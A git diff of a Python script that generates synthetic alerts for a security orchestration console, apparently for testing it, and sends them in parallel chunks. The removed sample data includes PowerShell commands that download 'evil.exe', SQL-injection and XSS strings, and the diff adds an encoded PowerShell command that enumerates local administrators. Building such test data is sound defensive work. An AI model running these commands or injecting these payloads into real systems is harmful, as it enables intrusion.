@@ -8,35 +8,42 @@ import random
 import socket
 import struct
 import sys
+import uuid
+from concurrent.futures import ThreadPoolExecutor
 
 host = 'http://localhost'
 
 AUTH_TOKEN = None
 
-USERNAME = sys.argv[1]
-PASSWORD = sys.argv[2]
-EVENT_COUNT = int(sys.argv[3])
+CONSOLE = sys.argv[1]
+USERNAME = sys.argv[2]
+PASSWORD = sys.argv[3]
+EVENT_COUNT = int(sys.argv[4])
 
 def auth():
-    response = requests.post('{}/api/v2.0/auth/login'.format(host),
+    response = requests.post('{}/api/v2.0/auth/login'.format(CONSOLE),
                              data=json.dumps({'email':USERNAME, 'password':PASSWORD}),
                              headers={'Content-Type': 'application/json'}, verify=False)
     if response.status_code == 200:
         token = response.json()['access_token']
         return token
     else:
+        print(response.text)
         return None
 
+token = auth()
 
 def bulk(events):
 
-    token = auth()
+    
+    
     if token:
         headers = {
             'Content-Type': 'application/json',
             'Authorization': 'Bearer '+token
         }
-        response = requests.post('{}/api/v2.0/event/_bulk'.format(host),
+
+        response = requests.post('{}/api/v2.0/event/_bulk'.format(CONSOLE),
                                  data=json.dumps({"events": events}),
                                  headers=headers, verify=False)
         if response.status_code == 200:
@@ -47,10 +54,7 @@ def bulk(events):
         return events
     
 def reference():
-    hasher = hashlib.md5()
-    hasher.update(str(random.randint(0,1000)+datetime.datetime.utcnow().timestamp()).encode())
-    return base64.b64encode(hasher.digest()).decode()
-
+    return str(uuid.uuid4())
 
 def case_templates():
   
@@ -60,11 +64,11 @@ def case_templates():
 
 def random_title_description():
   titles = [
-    {'Rule Testing': 'A test event used for rule testing'},
-    {'User added to local administrators': 'Someone added a normal user to local admins'},
-    {'Suspicious DNS hit': 'A machine made a request for a suspicious DNS record'},
-    {'Local account discovery': 'A machine exhibited enumeration behavior'},
-    {'CVE-2021-40444': 'Remote code execution via malicious document in word'}
+    {'New Process Name in the last 30 days': 'A test event used for rule testing'},
+    #{'User added to local administrators': 'Someone added a normal user to local admins'},
+    #{'Suspicious DNS hit': 'A machine made a request for a suspicious DNS record'},
+    #{'Local account discovery': 'A machine exhibited enumeration behavior'},
+    #{'CVE-2021-40444': 'Remote code execution via malicious document in word'}
   ]
 
   return titles[random.randint(0, len(titles)-1)]
@@ -122,16 +126,8 @@ def random_ip():
 
 def random_powershell_command():
   commands = [
-    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
-    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
-    'administrator") OR 1=1 --;',
-    'alert(1);',
-    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
-    '<IMG SRC="javascript:alert(\'XSS\');">',
-    '<IMG SRC=javascript:alert(\'XSS\')>',
-    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
-    '<script>alert(\'xss\')</script>'
-    '<iframe src="http://docs.reflexsoar.com/en/latest/"/>'
+
+    'cmd.exe" /C powershell -NonInteractive -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAHQAZQB4AHQAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0AQwBvAG0AbQBhAG4AZAAgACcAJgAgAHsARwBlAHQALQBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBHAHIAbwB1AHAAIAAnACcAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACcAJwAgAHwAIABzAGUAbABlAGMAdAAgAE4AYQBtAGUAfQAnACAAPgAgACIAQwA6AFwAVQBzAGUAcgBzAFwATgBCAEEAUwBDAFUAfgAxAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABwAG8AdwBlAHIAYwBsAGkAdgBtAHcAYQByAGUAMQA3ADcAIgA7ACAAZQB4AGkAdAAgACQAbABhAHMAdABlAHgAaQB0AGMAbwBkAGUA'
   ]
 
   return commands[random.randint(0, len(commands)-1)]
@@ -161,7 +157,7 @@ def random_event():
       "severity": random_severity(),
       "observables": [
         {
-          "value": hostname,
+          "value": "ha-l-carroll",
           "ioc": False,
           "tlp": 2,
           "spotted": False,
@@ -284,35 +280,61 @@ def random_event():
           "safe": False,
           "data_type": "auto",
           "source_field": "source_ip",
-          "tags": [
+          "tags": [ 
             "firewall",
             "source"
+          ]
+        },
+        {
+          "value": "52.180.181.61",
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "ip",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall"
+          ]
+        },
+        {
+          "value": 59852,
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "port",
+          "source_field": "destination_port",
+          "tags": [
+            "destination_port"
           ]
         }
       ],
       #"raw_log": json.dumps({"destination":{"ip": ip}})
-      "raw_log": json.dumps({'raw_log': {'match_body': {'event_data': {'TargetUserName': 'svc_justin'}}}})
+      "raw_log": json.dumps({'match_body': {'event_data': {'TargetUserName': 'svc_justin'}}, 'host': {'name': 'HA-D-Awalt'}, 'user': {'name': 'josh', 'domain': 'TELLARO', 'target': {'name': 'justin', 'domain': 'TELLARO'}}})
     }
   ]
 
   return alerts[random.randint(0, len(alerts)-1)]
 
 
-while True:
-  events = []
-  for i in range(0,EVENT_COUNT):
-    headers = {
-      'Content-Type': 'application/json'
-    }
-    event = random_event()
-   
-    events.append(event)
-                                  
-    #if i % 2 == 0 :
-    #  event['reference'] = reference()
-    #  events.append(event)
 
-  print("Sending {} events...".format(len(events)))
-  bulk(events)
-  time.sleep(1)
-  break
+events = []
+for i in range(0,EVENT_COUNT):
+  headers = {
+    'Content-Type': 'application/json'
+  }
+  event = random_event()
+  
+  events.append(event)
+                                
+  #if i % 2 == 0 :
+  #  event['reference'] = reference()
+  #  events.append(event)
+
+# Split the events into 250 event chunks and send them
+# in parallel using a thread pool
+chunks = [events[x:x+250] for x in range(0, len(events), 250)]
+
+with ThreadPoolExecutor(max_workers=10) as executor:
+  executor.map(bulk, chunks)
